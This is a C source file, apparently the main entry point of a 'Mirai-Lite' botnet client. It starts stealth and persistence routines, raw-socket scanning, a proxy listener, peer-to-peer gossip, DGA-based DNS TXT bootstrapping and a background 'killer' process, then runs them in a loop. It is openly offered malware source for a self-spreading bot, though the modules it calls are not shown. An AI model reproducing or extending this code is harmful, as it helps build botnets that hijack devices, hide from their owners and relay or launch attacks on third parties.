#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

#include "scanner.h"
#include "proxy.h"
#include "p2p.h"
#include "stealth.h"
#include "killer.h"
#include "attack.h"
#include "dga.h"
#include <arpa/inet.h>

volatile sig_atomic_t stop_flag = 0;

void handle_signal(int sig) {
    (void)sig;
    stop_flag = 1;
}

int main(int argc, char *argv[]) {
    // 0. Stealth & Persistence (FIRST THING)
    // Removed process masking if debug mode
    if (argc > 1 && strcmp(argv[1], "--debug") == 0) {
        printf("[Mirai-Lite] DEBUG MODE (Stealth Disabled)\n");
    } else {
        stealth_init(argc, argv);
    }
    
    // 1. Signal Handling
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    // (Daemonize logic skipped for brevity)

    // 2. Init Components
    if (!scanner_init()) {
        fprintf(stderr, "[-] Failed to init Scanner (Running as root?)\n");
    } else {
        printf("[+] Scanner Initialized (Raw Sockets)\n");
    }

    int proxy_sock = proxy_init();
    if (proxy_sock < 0) {
        fprintf(stderr, "[-] Failed to init Proxy\n");
        return 1; // Proxy is critical
    }
    printf("[+] Proxy listening on port %d\n", PROXY_LISTEN_PORT);

#include "dns.h"

    int p2p_sock = p2p_init();
    if (p2p_sock < 0) {
        fprintf(stderr, "[-] Failed to init P2P\n");
        // Proceed anyway, maybe isolated node
    } else {
        printf("[+] P2P listening on port %d\n", P2P_PORT);
        
        // 1. Hardcoded Seed
        p2p_add_neighbor(inet_addr("127.0.0.1"), htons(P2P_PORT));
        
        // 2. DNS TXT Seed (Robust)
        printf("[*] Resolving seeds from DNS TXT...\n");
        char *domain = dga_get_domain();
        printf("[*] Target Domain: %s\n", domain);
                if (dns_resolve_txt(domain) == 0) { // Placeholder Domain
             printf("[+] DNS Bootstrap Complete\n");
        } else {
             printf("[-] DNS Bootstrap Failed (Expected if domain invalid)\n");
        }
    }

    // 2b. Start Killer (Background)
    killer_init();
    printf("[+] Killer Process Started (Background)\n");

    // 3. Main Loop
    printf("[+] Entering Main Loop...\n");
    
    time_t last_gossip = time(NULL);

    while (!stop_flag) {
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(proxy_sock, &read_fds);
        if (p2p_sock >= 0) FD_SET(p2p_sock, &read_fds);

        int max_fd = (proxy_sock > p2p_sock) ? proxy_sock : p2p_sock;

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 10000; // 10ms

        int activity = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);

        if ((activity < 0) && (errno != EINTR)) {
            perror("Select error");
        }

        // Handle Proxy Traffic
        if (activity > 0) {
            if (FD_ISSET(proxy_sock, &read_fds)) {
                proxy_handle_new_conn(proxy_sock);
            }
            if (p2p_sock >= 0 && FD_ISSET(p2p_sock, &read_fds)) {
                p2p_handle_packet(p2p_sock);
            }
        }

        // Handle Scanner
        scanner_run_batch();

        time_t now = time(NULL);

        // Handle Gossip (60s)
        if (now - last_gossip > (GOSSIP_INTERVAL_MS / 1000)) {
            p2p_gossip(p2p_sock);
            last_gossip = now;
        }

        // Killer runs in background child process (started at init)
    }

    printf("[*] Shutting down...\n");
    killer_kill(); // Stop killer child
    scanner_info();
    close(proxy_sock);
    if (p2p_sock >= 0) close(p2p_sock);

    return 0;
}
